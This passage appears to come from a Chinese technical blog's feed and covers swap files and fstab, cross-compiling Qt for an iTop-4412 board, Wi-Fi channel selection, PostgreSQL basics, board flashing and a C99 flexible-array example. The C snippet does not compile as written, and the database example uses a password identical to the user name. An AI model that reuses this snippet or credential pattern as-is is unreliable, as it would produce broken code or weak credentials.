id="2-mkswap-格式化建立为swap分区"><a href="#2-mkswap-格式化建立为swap分区" class="headerlink" title="2.  mkswap 格式化建立为swap分区"></a>2.  mkswap 格式化建立为swap分区</h6><pre><code>[root@localhost media]# mkswap swap Setting up swapspace version 1, size = 1048572 KiBno label, UUID=813e76bc-e187-4d29-99d0-c577d4a11de3</code></pre><h6 id="3-进行swap交换分区挂载：-swapon"><a href="#3-进行swap交换分区挂载：-swapon" class="headerlink" title="3.  进行swap交换分区挂载： swapon"></a>3.  进行swap交换分区挂载： swapon</h6><pre><code>[root@localhost media]# swapon swap swapon: /media/swap: insecure permissions 0644, 0600 suggested.Ps: 发现原先制作文件权限为644，系统认为不安全， 建议修改为600chmod  600 /media/swap此时已经被挂载:</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost media]# free </span><br><span class="line">            total        used        free      shared  buff/cache   available</span><br><span class="line"> Mem:        1032040       59124       74604       13168      898312      803308</span><br><span class="line"> Swap:       1048572           0     1048572</span><br></pre></td></tr></table></figure><h6 id="1-关闭交换分区-swapoff"><a href="#1-关闭交换分区-swapoff" class="headerlink" title="1.    关闭交换分区  swapoff"></a>1.    关闭交换分区  swapoff</h6><p>swapoff /media/swap</p><pre><code>[root@localhost media]# swapoff /media/swap [root@localhost media]# [root@localhost media]# free              total        used        free      shared  buff/cache   availableMem:        1032040       58500       70876       13168      902664      804028Swap:             0           0           0</code></pre><p>此时仅仅是临时生效，为了能够让swap自动挂载，要修改/etc/fstab文件</p><pre><code>vi /etc/fstab在文件末尾加上    /media/swap    swap swap defaults 0 0等同    UUID=813e76bc-e187-4d29-99d0-c577d4a11de3 swap swap defaults 0 0 #填写mkswap 时产生的uuid这样就算重启系统，swap分区就不用手动挂载了。</code></pre><h6 id="4-字段定义"><a href="#4-字段定义" class="headerlink" title="4.   字段定义"></a>4.   字段定义</h6><p>  /etc/fstab 文件包含了如下字段，通过空格或Tab分隔:</p><pre><code>&lt;file system&gt;   &lt;dir&gt;   &lt;type&gt;   &lt;option&gt;   &lt;dump&gt;   &lt;pass&gt;</code></pre><ul><li>&lt; file system &gt; – 要挂在的分区或存储设备</li><li>&lt; dir &gt;         – &lt; file system &gt;的挂载位置</li><li>&lt; type &gt;        – 要挂在设备或是分区的文件系统类型，支持许多种不同的文件系统:ext2, ext3, ext4, reiserfs. xfs, jfs, smbfs, iso9660, fat, ntfs, swap, 以及auto， 设置为auto类型，mount命令会猜测使用的文件系统类型，对CDROM 和 DVD 移动设备非常有用。</li><li>&lt; options &gt;     – 挂载时使用的参数，常用参数:<ul><li>auto          –    在启动时键入了mount -a命令时自动挂载</li><li>noauto        –    只在你的命令下被挂载</li><li>exec          –    允许执行此分区的二进制文件</li><li>noexec        –    不允许执行此文件系统上的二进制文件</li><li>ro            –    以只读模式挂载文件系统</li><li>rw            –    以读写模式挂载文件系统</li><li>user          –    允许任意用户挂载此文件系统，若无显示定义，隐含启用 noexec，nosuid，nodev参数</li><li>users         –    允许所有users组中的用户挂载文件系统</li><li>nouser        –    只能被root挂载</li><li>owner         –    允许设备所有者挂载</li><li>sync          –    I/O同步进行</li><li>async         –    I/O异步进行</li><li>dev           –    解析文件系统上的块特殊设备</li><li>nodev         –    不解析文件系统上的块特殊设备</li><li>suid          –    允许suid 操作和设定sgid位，这一参数通常用于一些特殊任务，是一般用户运行时临时提升权限</li><li>nosuid        –    禁止suid操作和设定sgid位</li><li>noatime       –    不更新文件系统上inode访问记录，可以提升性能(atime)</li><li>nodiratime    –    不更新文件系统上的目录inode访问记录，可以提升性能(atime)</li><li>relatime      –    实时更新inode access记录，只有在记录中的访问时间早于当前访问才会被更新(atime)</li><li>flush         –    vfat选项，更频繁的刷新数据，复制对话框或进度条在全部数据都写入后才消失</li><li>defaults      –    使用文件系统的默认挂载参数，例如  ext4 的默认参数为 rw，suid，dev， exec， auto， mouser，async</li></ul></li><li>&lt; dump &gt;     –  dump工具通过它决定何时做备份，dump会检查其内容，并用数字来决定对这个文件系统进行备份，允许的数字是0和1，  0标示忽略， 1则进行备份， 大部分用户并没有安装dump， 对他们来说，应当设置为0</li><li>&lt; pass &gt;     –  fsck读取&lt; pass &gt;的数值来决定需要检查的文件系统的检查顺序，允许的数字0，1和2， 根目录应当获取最高的优先权1 其他所有需要被检查的设备设置为2， 0表示设备不会被fsck所检查。</li></ul><h6 id="5-文件系统的标识"><a href="#5-文件系统的标识" class="headerlink" title="5.  文件系统的标识"></a>5.  文件系统的标识</h6><pre><code>1.  在/etc/fstab 配置文件中你可以采用三种表示文件系统，内核名称 ，uuid或者label。 使用uuid或是label的好处在于他们与磁盘顺序无关，如果在bios中改变了你的存储设备顺序，或者重新插拔存储设那么使用uuid或者label将会更加有效          root@iTOP4412-ubuntu-desktop:~# lsblk -f    NAME        FSTYPE LABEL   MOUNTPOINT    mmcblk0    ├─mmcblk0p1    ├─mmcblk0p2 ext3           /        ├─mmcblk0p3 ext3           /media/517cbd48-ef56-5b23-5473-c03ff34d5f1a    └─mmcblk0p4 ext3          /media/bf00f10e-5ddb-90e9-c2f7-2ec4ed55592</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>iTop 4412 移植QtE5.7</title>
      <link href="/2017/08/09/arm-4412/iTop-4412-%E7%A7%BB%E6%A4%8DQtE5-7/"/>
      <url>/2017/08/09/arm-4412/iTop-4412-%E7%A7%BB%E6%A4%8DQtE5-7/</url>
      
        <content type="html"><![CDATA[<p>配套组件:<br>    Ubuntu环境:    Ubuntu 16.04<br>    arm 编译器:    arm-20140.05-29<br>    触摸tslib:    1.4版本<br>    QtE 源码:    QtE5.7.0</p><a id="more"></a><p><br></p><h4 id="1-编译器环境变量的配置"><a href="#1-编译器环境变量的配置" class="headerlink" title="1.    编译器环境变量的配置:"></a>1.    编译器环境变量的配置:</h4><ol><li>加入到PATH<ol><li>arm-none-inux-gnuwabi-gcc  -v  异常:<br>sudo apt-get install lib32zl  lib32ncurses5 ia-32libs</li></ol></li></ol><p><br></p><h4 id="2-编译tslib-–触摸屏代码"><a href="#2-编译tslib-–触摸屏代码" class="headerlink" title="2.    编译tslib  –触摸屏代码;"></a>2.    编译tslib  –触摸屏代码;</h4><ol><li>解压源码 tslib-1.4.tar.gz </li></ol><pre><code>sudo apt-get install autoconfsudo apt-get install automakesudo apt-get install libtool./autogen.sh./configure CC=arm-none-linux-gnueabi-gcc CXX=arm-none-linux-gnueabi-g++ --host=arm-none-linux-gnueabi -prefix=/opt/tslib1.4make &amp;&amp; make install //将会被安装在  /opt/tslib1.4/  目录下；</code></pre><p><br></p><h4 id="3-Qt源码编译。-将gcc-g-编译器修改为arm交叉编译器即可"><a href="#3-Qt源码编译。-将gcc-g-编译器修改为arm交叉编译器即可" class="headerlink" title="3.  Qt源码编译。 将gcc g++编译器修改为arm交叉编译器即可;"></a>3.  Qt源码编译。 将gcc g++编译器修改为arm交叉编译器即可;</h4><pre><code>1.  vi    qt-everywhere-opensource-src-5.7.0/qtbase/mkspecs/linux-arm-gnueabi-g++/qmake.conf        #        # qmake configuration for building with arm-linux-gnueabi-g++        #        MAKEFILE_GENERATOR      = UNIX        CONFIG                 += incremental        QMAKE_INCREMENTAL_STYLE = sublib        QT_QPA_DEFAULT_PLATFORM = linux #eglfs        QMAKE_CFLAGS_RELEASE += -O2 -march=armv7-a        QMAKE_CXXFLAGS_RELEASE += -O2 -march=armv7-a        include(../common/linux.conf)        include(../common/gcc-base-unix.conf)        include(../common/g++-unix.conf)        # modifications to g++.conf        QMAKE_CC                = arm-none-linux-gnueabi-gcc        QMAKE_CXX               = arm-none-linux-gnueabi-g++        QMAKE_LINK              = arm-none-linux-gnueabi-g++        QMAKE_LINK_SHLIB        = arm-none-linux-gnueabi-g++        # modifications to linux.conf        QMAKE_AR                = arm-none-linux-gnueabi-ar cqs        QMAKE_OBJCOPY           = arm-none-linux-gnueabi-objcopy        QMAKE_NM                = arm-none-linux-gnueabi-nm -P        QMAKE_STRIP             = arm-none-linux-gnueabi-strip        load(qt_config)</code></pre><p><br></p><pre><code>2. vi    qt-everywhere-opensource-src-5.7.0/autoConfigure.sh        #!/bin/sh        ./configure \        -v \        -prefix /opt/qt-5.7.0 \        -release \        -opensource \        -no-accessibility        -make libs \        -xplatform linux-arm-gnueabi-g++ \        -optimized-qmake \        -pch \        -qt-sql-sqlite \        -qt-zlib \        -tslib \        -no-opengl \        -no-sse2 \        -no-openssl \        -no-nis \        -no-cups \        -no-glib \        -no-pkg-config \        -no-separate-debug-info \        -I/opt/tslib1.4/include -L/opt/tslib1.4/lib</code></pre><p><br></p><pre><code>3.    make &amp;&amp; make install     将/opt/qt-5.7.0和/opt/tslib1.4 拷贝到开发板的文件系统中对应的目录中。     /放置到开发板opt/ 目录下即可;    设置环境变量，并source生效;</code></pre><p><br></p><p><a href="http://blog.csdn.net/u012175418/article/details/52704734" target="_blank" rel="noopener">tslib qt5.7移植参考</a></p><p><a href="http://www.cnblogs.com/sky-heaven/p/5121083.html" target="_blank" rel="noopener">tslib 编译常见问题 以及解决办法</a></p>]]></content>
      
      
      <categories>
          
          <category> Arm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Tp-link 信道</title>
      <link href="/2017/08/08/kali/tp-link-%E4%BF%A1%E9%81%93/"/>
      <url>/2017/08/08/kali/tp-link-%E4%BF%A1%E9%81%93/</url>
      
        <content type="html"><![CDATA[<h3 id="一、-什么是信道"><a href="#一、-什么是信道" class="headerlink" title="一、 什么是信道:"></a>一、 什么是信道:</h3><blockquote><p> 信道， 也称作通道或者频段， 是以无线信号作为传输载体的数据信号传送通道。<br> 2.4G频段的工作频率为2.4-2.4835Ghz， 这个83.5MHz 频带划分为13个信道。 各信道中心频率相差5Mhz，向上向下分别扩展11Mhz， 信道宽带22Mhz    中国采用欧洲/ETSI标准，使用1-13信道。</p></blockquote><a id="more"></a><p><br></p><p>　　<img src="/img/tplink/tp_link_hz.png" alt="IEEE802.11b/g  2.44Ghz通道"></p><blockquote><p> 相近无线路由器采用相同或者重叠信道会形成信道竞争关系， 相互影响无线链路质量，为了有效避免信道重叠造成的相互干扰，相近无线路由器应选择互不重叠的信道工作，如(1/、6、11)  或者 (1、7、13)  等;</p></blockquote><p><br></p><h3 id="二、-信道推荐自动选择"><a href="#二、-信道推荐自动选择" class="headerlink" title="二、 信道推荐自动选择"></a>二、 信道推荐自动选择</h3><blockquote><p> 早期无线路器出厂时预设相同的信道(大多为6)，因用户很少会修改信道，从未导致相互影响的情况.随着无线应用的迅速普及，无线路由器增加了信道自动选择功能，在设备启动时，检测周围无线信道分布情况，选择最佳信道工作。</p><p> 无线信道自动选择的作用是: 信道重叠会导致无线路由器相互干扰， 进而影响无线传输质量，信道自动选择功能使路由器根据周围无线环境自动设置最佳工作信道， 有效避免同频干扰/竞争.</p></blockquote><p><br></p><h3 id="三、-什么情况需要手动选择信道"><a href="#三、-什么情况需要手动选择信道" class="headerlink" title="三、 什么情况需要手动选择信道"></a>三、 什么情况需要手动选择信道</h3><p>在以下应用中，我们建议手动选择路由器的信道：</p><blockquote><p>   1、传统界面路由器在设置WDS无线桥接或多个无线路由器通过LAN-LAN级联设置漫游网络时时，建议设置固定的信道；</p><p>   2、部分无线终端可能无法识别12或13信道，当路由器自动选择这两个信道时，无线终端无法搜索到信号，此时需要将路由器的信道固定为1-11之间。</p><p>   3、无线干扰严重。无线信道自动选择功能在路由器启动后会根据当前的环境自动设置到最佳工作信道，直到路由器重启前，该信道都不会改变，但实际环境中，可能路由器工作过程中周围无线环境发生了变化，引起较强的无线干扰，此时需要考虑手动设置信道。</p></blockquote><p><br></p><h3 id="四、-手机软件扫描软件"><a href="#四、-手机软件扫描软件" class="headerlink" title="四、 手机软件扫描软件"></a>四、 手机软件扫描软件</h3><blockquote><p>   Next</p></blockquote><p><img src="/img/tplink/tp_link_hz_1.png" alt="Next 扫描工具"></p><font color="red">注意：信号强度以负数表示，其绝对值越小，表示信号越强。例如扫描的A信号强度为-45，B信号为-70，则A信号强于B信号。</font><p>根据周围环境中其他信号使用的信道和强度，在自己无线路由器中选择一个没有使用的信道或者周围弱信号使用的信道。</p><p><br></p><p><a href="http://service.tp-link.com.cn/detail_article_3272.html" target="_blank" rel="noopener">参考Tp_link 服务支持</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Postgresql 入门学习</title>
      <link href="/2017/07/15/database/Postgresql-%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/"/>
      <url>/2017/07/15/database/Postgresql-%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h5 id="自从mysql被Oracle收购之后，-Postgresql逐渐成为开源关系型数据库的首选"><a href="#自从mysql被Oracle收购之后，-Postgresql逐渐成为开源关系型数据库的首选" class="headerlink" title="自从mysql被Oracle收购之后， Postgresql逐渐成为开源关系型数据库的首选."></a>自从mysql被Oracle收购之后， Postgresql逐渐成为开源关系型数据库的首选.</h5><h5 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库:"></a>关系型数据库:</h5><blockquote><p> 采用标准sql语句， 进行数据的检索 和 操作;</p></blockquote><p>主要从Ubutnu/Debain apt-get 系列讲解安装Postgresql</p><a id="more"></a><p><br></p><h5 id="1-Install-PostGresql"><a href="#1-Install-PostGresql" class="headerlink" title="1.    Install PostGresql"></a>1.    Install PostGresql</h5><p>安装PostgreSql客户端</p><pre><code>sudo apt-get install postgresql-client</code></pre><p>安装PostgreSql服务端</p><pre><code>sudo apt-get install postgresql</code></pre><p><img src="/img/postgresql/install_postgresql_01.png" alt="安装配置信息"></p><blockquote><p>  基本配置信息在上图均有体现:<br><em>.  config 配置目录</em>.  data   数据<br><em>.  locale 本地编码</em>.  port   端口信息</p></blockquote><p><br></p><h5 id="2-添加新用户-和-新数据库"><a href="#2-添加新用户-和-新数据库" class="headerlink" title="2.    添加新用户 和 新数据库"></a>2.    添加新用户 和 新数据库</h5><pre><code>安装之后，默认生成一个名为postgres的数据库 和 一个 名为 postgres 的数据库用户，  同时还生成了一个postgres的Linux系统用户    sudo su - postgres    // 登陆到postgres用户    psql                  // 链接进postgresql数据管理软件  -- 相当使用 postgres 数据库用户</code></pre><p><img src="/img/postgresql/install_postgresql_02.png" alt="psql 登陆状态"></p><pre><code>\password  postgres    // 为postgres 数据库用户创建密码创建数据库用户:    create user dbuser with password &apos;dbuser&apos;;创建用户数据库:    create database dbuserdb owner  dbuser;权限分配    grant all privileges on database dbuserdb to dbuser;</code></pre><p><img src="/img/postgresql/install_postgresql_03.png" alt="psql 创建新用户 以及 创建数据 权限"></p><p><br></p><h5 id="3-登陆数据库"><a href="#3-登陆数据库" class="headerlink" title="3.    登陆数据库"></a>3.    登陆数据库</h5><pre><code>sql  -U 用户名  -d 数据库名称  -h ip地址  -p 端口</code></pre><p><img src="/img/postgresql/install_postgresql_04.png" alt="dbuser用户登陆"></p><pre><code>当使用当前用户登陆时， 可以省略 -U 标签;</code></pre><!--恢复外部数据:        psql dbuserdb < dbuserdb.sql;--><p><br></p><h5 id="4-控制台命令"><a href="#4-控制台命令" class="headerlink" title="4.    控制台命令:"></a>4.    控制台命令:</h5><ul><li>\h        查看SQL语句的解释    \h select</li><li>\?      查看psql命令列表</li><li>\l      列出所有数据库</li><li>\c      [database_name]  链接其他数据库</li><li>\d      列出当前数据库的所有表格</li><li>\d      [table_name]</li><li>\du     列出所有用户</li><li>\e      打开文本编辑器</li><li>\conninfo      列出当前数据库和链接的信息</li><li>\password    修改用户密码</li></ul><p><br></p><h5 id="5-基本数据库操作"><a href="#5-基本数据库操作" class="headerlink" title="5.    基本数据库操作:"></a>5.    基本数据库操作:</h5><p>基本关系型数据库基本通用sql<br>&gt;<br>    create  select insert update alter drop delete 等常用命令</p><pre><code>1. #查看表结构dbuserdb=&gt; \d sysuser     Table &quot;public.sysuser&quot; Column  |         Type          | Modifiers  ----------+-----------------------+----------- id       | integer               | username | character varying(30) | sigdate  | date                  |2. #创建表create table sysuser(id int, username varchar(30), sigdate date);3. #插入数据insert into sysuser (id, username , sigdate) values(1, &apos;Postgres&apos;, now());4. #查询特定条件dbuserdb=&gt; select * from  sysuser where id=1; id | username |  sigdate----+----------+------------  1 | Postgres   | 2017-07-12(1 row)5. #删除记录dbuserdb=&gt; delete from sysuser where id=1;DELETE 16. #添加特殊条件dbuserdb=&gt; alter table sysuser alter column id set not null;ALTER TABLEdbuserdb=&gt;dbuserdb=&gt; \d sysuser;            Table &quot;public.sysuser&quot;  Column  |         Type          | Modifiers----------+-----------------------+----------- id       | integer               | not null username | character varying(30) | sigdate  | date                  | eamil    | character varying(20) |7. #修改表名dbuserdb=&gt; alter table sysuser rename to systemuser;ALTER TABLEdbuserdb=&gt; \d          List of relations Schema |    Name    | Type  | Owner--------+------------+-------+-------- public | systemuser | table | dbuser(1 row)8. #修改列名dbuserdb=&gt; alter table systemuser rename COLUMN sigdate to sig_datedbuserdb-&gt; ;ALTER TABLEdbuserdb=&gt;dbuserdb=&gt; \d systemuser;          Table &quot;public.systemuser&quot;  Column  |         Type          | Modifiers----------+-----------------------+----------- id       | integer               | not null username | character varying(30) | sig_date | date                  | eamil    | character varying(20) |9. #删除字段:dbuserdb=&gt; alter table systemuser drop column eamil ;ALTER TABLEdbuserdb=&gt;dbuserdb=&gt; \d systemuser          Table &quot;public.systemuser&quot;  Column  |         Type          | Modifiers----------+-----------------------+----------- id       | integer               | not null username | character varying(30) | sig_date | date                  |10. #更新字段:dbuserdb=&gt; \d      List of relations Schema |    Name    | Type  | Owner--------+------------+-------+-------- public | systemuser | table | dbuser(1 row)dbuserdb=&gt; \d systemuser          Table &quot;public.systemuser&quot;  Column  |         Type          | Modifiers----------+-----------------------+----------- id       | integer               | not null username | character varying(30) | sig_date | date                  |dbuserdb=&gt;dbuserdb=&gt; select * from systemuser ; id | username | sig_date----+----------+----------(0 rows)                                               ^dbuserdb=&gt; insert into systemuser (id, username , sig_date) values(1, &apos;Postgres&apos;, now());INSERT 0 1dbuserdb=&gt;dbuserdb=&gt;dbuserdb=&gt; select * from systemuser ; id | username |  sig_date----+----------+------------  1 | Postgres   | 2017-07-12(1 row)dbuserdb=&gt; update systemuser set username = &apos;wang&apos; where id = 1;UPDATE 1dbuserdb=&gt; select * from systemuser ; id | username |  sig_date----+----------+------------  1 | wang     | 2017-07-12(1 row)11. #删除表dbuserdb=&gt; drop table systemuser ;DROP TABLEdbuserdb=&gt;dbuserdb=&gt; \dNo relations found.dbuserdb=&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
            <tag> Postgresql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>讯为 4412 arm 开发板烧写系统</title>
      <link href="/2017/07/15/arm-4412/%E8%AE%AF%E4%B8%BA-4412-%E5%BC%80%E5%8F%91%E6%9D%BF%E7%83%A7%E7%BA%B8%E7%B3%BB%E7%BB%9F/"/>
      <url>/2017/07/15/arm-4412/%E8%AE%AF%E4%B8%BA-4412-%E5%BC%80%E5%8F%91%E6%9D%BF%E7%83%A7%E7%BA%B8%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h3 id="工具软件"><a href="#工具软件" class="headerlink" title="工具软件"></a>工具软件</h3><p>usb 转 串口: </p><pre><code>iTOP-4412开发板所需PC软件（工具）\01-USB转串口（PL2302驱动）\win8.1串口驱\迅为_PL2303_win8.1.exe</code></pre><p>烧制软件：</p><pre><code>iTOP-4412开发板所需PC软件（工具）\05-fastboot烧写工具\platform-tools</code></pre><a id="more"></a><p><br></p><h3 id="镜像-与-ADB"><a href="#镜像-与-ADB" class="headerlink" title="镜像 与 ADB"></a>镜像 与 ADB</h3><p>将 ubuntu 源码 镜像:</p><ul><li>system</li><li>uboot</li><li>zImage</li><li>zImage_sd</li></ul><p>放置在烧制软件的根目录下。 并建立Ubutnu目录，存放;</p><blockquote><p>确认是否终端 &amp; 串口保持链接:</p><ol><li>首先打开超级终端选用com3 连接到arm开发板; </li><li>先检查adb 是否链接成功;</li><li>在使用cmd进行烧制</li></ol></blockquote><p><img src="/img/arm-4412/uboot01.png" alt=""><br><img src="/img/arm-4412/uboot02.png" alt=""><br>发现adb驱动未安装;</p><pre><code>android_usb_40_1_2_3_64.exe  // 安装驱动；</code></pre><p><img src="/img/arm-4412/uboot03.png" alt="adb"></p><pre><code>发现安装成功， 并显示android Phone . 即安装成功;</code></pre><p>​</p><h3 id="Arm-板分区格式化"><a href="#Arm-板分区格式化" class="headerlink" title="Arm 板分区格式化"></a>Arm 板分区格式化</h3><p> 给eMMC创建分区并格式化:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fdisk -c 0</span><br></pre></td></tr></table></figure><p><img src="/img/arm-4412/20170228220537889.png" alt="img"></p><p>按照默认方式给eMMC分区，可以分为四个区：用户应用区、系统区、用户资料去、缓存区。</p><p>fdisk的Usage:<br>​    fdisk &lt;-p&gt;  &lt;device_num&gt;<br>​    fdisk &lt;-c&gt;  &lt;device_num&gt; [&lt;sys. part size(MB)&gt; &lt;user part size&gt; &lt;cache part size&gt;]<br>-p代表查看操作，-c代表分区操作<br>device_num=0 代表eMMC;device_num=1 代表TF/SD卡<br>不加参数时按照默认方式进行分区;加参数时按照参数大小对存储器后三个区进行分区，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fdisk -c 0 300 300 300</span><br></pre></td></tr></table></figure><p>​</p><h3 id="Arm-4412-Ubuntu烧写"><a href="#Arm-4412-Ubuntu烧写" class="headerlink" title="Arm-4412 Ubuntu烧写"></a>Arm-4412 Ubuntu烧写</h3><p>烧制Ubuntu过程:   必须使用tf卡;</p><blockquote><ol><li>打开fastboot烧制软件 cmd 命令窗口;</li><li>将tf卡直接插入arm开发板中;  进行tf卡对应分区<ol><li>fdisk -c  1 2700 50 50</li><li>fatformat mmc 1:1</li><li>ext3format mmc 1:2</li><li>ext3format mmc 1:3</li><li>ext3format mmc 1:4</li></ol></li><li>拔下电源，  使用读卡器 读取 tf卡， 在ubuntu里查看其分区 fdisk -l  发现第一个 1:1 为ext3 即linux分区。 我们将system中的系统文件，解压到此分区下。<ol><li>中间可以使用 mount 文件挂载， 然后拷贝其中，并解压</li></ol></li><li>将tf卡链接到window下，建立sdupdate目录，将系统文件， zImage  zImage_sd 拷贝到此目录下</li><li>为arm板 插入tf卡，重新启动， 进入超级终端: 为板子进行烧制分区 以及 烧制镜像;<ol><li>fdisk -c 0 2700 300 300</li><li>fatformat mmc 0:1</li><li>ext3format mmc 0:2</li><li>ext3format mmc 0:3</li><li>ext3format mmc 0:4</li></ol></li><li>分区后，为板子加载引导: <ol><li>继续在超级终端中:  sdfuse flash bootloader u-boot-iTOP-4412.bin</li><li>烧制sd卡的引导驱动: sdfuse flash kernel zImage_sd</li><li>reset 重启;  此时我们将板子的分区以及引导做好了，但是我们的文件系统都是加载的tf卡的， 故我们还需要继续烧制文件系统到板子上</li></ol></li><li>进入ubutnu界面:<ol><li>fdisk -l  </li><li>我们会发现存在两个硬盘， 0 代表板子硬盘， 第二块则是我们的tf卡硬盘;</li><li>在主用户根目录下，建立mm, tf 目录， 将我们板子硬盘的<strong>第一个linux分区(ext3)</strong>挂载到mm下， tf卡的<strong>第一个分区(window fat)</strong>挂在到tf目录上，</li><li>我们会发现tf目录中存在ubuntu的文件镜像压缩包，将其拷贝到mm文件夹下； 并解压缩</li><li>最后我们烧制本身板子的文件系统， 即重启， 进入超级终端中:<ol><li>sdfuse flash kernel zImage</li><li>关机，拔下tf卡，即可加载板子上的文件系统镜像</li></ol></li></ol></li></ol></blockquote><hr><p><br></p><h3 id="Arm-4412-烧写安卓、Qt"><a href="#Arm-4412-烧写安卓、Qt" class="headerlink" title="Arm-4412 烧写安卓、Qt"></a>Arm-4412 烧写安卓、Qt</h3><p>烧制 安卓 qtE过程:</p><blockquote><p>  [以前少写可忽略] 进入超级终端: 为板子进行烧制分区 以及 烧制镜像;</p><pre><code>1.    fdisk -c 0 2700 300 3002.    fatformat mmc 0:13.    ext3format mmc 0:24.    ext3format mmc 0:35.    ext3format mmc 0:4</code></pre><ol><li>打开fastboot烧制软件 cmd 命令窗口;</li><li>烧制uboot:     fastboot.exe  flash  bootloader u-boot-iTop-4412.bin   – bootloader 引导驱动， 重新分区  / 写入之前在超级终端输入 fastboot; 并查看设备管理器是否扫描出arm板; 否则fastboot cmd的程序会一直等待 驱动;</li><li>烧制zImage: fastboot.exe flash kernel zImage</li><li>烧制ramdisk:    fastboot.exe flash ramdisk ramdisk-uboot.img</li><li>烧制system文件系统:    fastboot.exe flash system system.img</li><li>擦除：    fastboot -w</li><li>fastboot reboot</li></ol></blockquote><p><img src="/img/arm-4412/fastboot-qt.png" alt="烧写 qt"></p><p><br></p><h3 id="虚拟机编译镜像"><a href="#虚拟机编译镜像" class="headerlink" title="虚拟机编译镜像"></a>虚拟机编译镜像</h3><p>搭建ubuntu 14.04 编译环境  并 编译zImage 与 u-boot.bin:</p><blockquote><p>   因此重新搭建ubuntu 编译环境  将 arm交叉编译器移植过来<br>   发现一直到 /usr/local/arm/ 下并放置生成 PATH 环境变量发现并不能成功;</p></blockquote><p>编译 Uboot 引导文件;</p><p><img src="/img/arm-4412/uboot05.png" alt="error 异常"></p><p>解决:</p><pre><code>sudo apt-get install lib32z1   # 安装插件库;</code></pre><p>编译成功:</p><p><img src="/img/arm-4412/uboot06.png" alt="编译成功"></p><pre><code>cp  config_for_linux_pop_supper .configmake zImage</code></pre><p><img src="/img/arm-4412/uboot08.png" alt="编译zImage"></p>]]></content>
      
      
      <categories>
          
          <category> Arm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>fixablearray-柔性数组</title>
      <link href="/2017/07/12/cpluscplus/fixablearray-%E6%9F%94%E6%80%A7%E6%95%B0%E7%BB%84/"/>
      <url>/2017/07/12/cpluscplus/fixablearray-%E6%9F%94%E6%80%A7%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<p> C99规定:</p><blockquote><p> 不完整类型是这样一种类型， 它缺乏足够的信息   例如长度去描述一个完整的对象;  它的出现反映出C程序员对精炼代码的极致追求。产生了对动态结构的需求; </p><p> C99 使用不完整类型实现柔性数组成员.  C99中  结构中的最后一个元素允许是未知大小的数组. 这就是 柔性数组  也叫做 伸缩性数组成员;</p><p> 但是结构体中的柔性成员前边  <strong>必须至少有一个其他成员</strong>.  </p><p> 柔性数组成员 <strong>只作为一个符号地址存在</strong> ， 而且<strong>必须是结构体的最后一个成员</strong>.      sizeof 返回这种结构体的大小不包括柔性数组的内存；</p></blockquote><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">typedef struct fixarray&#123;</span><br><span class="line"></span><br><span class="line">    int size; </span><br><span class="line"></span><br><span class="line">    int value[]; // 柔性数组; </span><br><span class="line"></span><br><span class="line">&#125;fixarray;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 创建时  最好用malloc 预留足够的大小; 放置内存溢出</span><br><span class="line">fixarray *stpTest = (test *)malloc(sizeof(fixarray)+100*sizeof(int));  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    printf(&quot;sizeof(int) = %d\n&quot;, sizeof(int)); // 大小为4</span><br><span class="line"></span><br><span class="line">    printf(&quot;sizeof(fixarray) = %d\n&quot;, sizeof(fixarray));// 大小为4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Centos 7 搭建Vsftpd</title>
      <link href="/2017/07/12/yunwei/Centos-7-%E6%90%AD%E5%BB%BAvsftpd/"/>
      <url>/2017/07/12/yunwei/Centos-7-%E6%90%AD%E5%BB%BAvsftpd/</url>
      
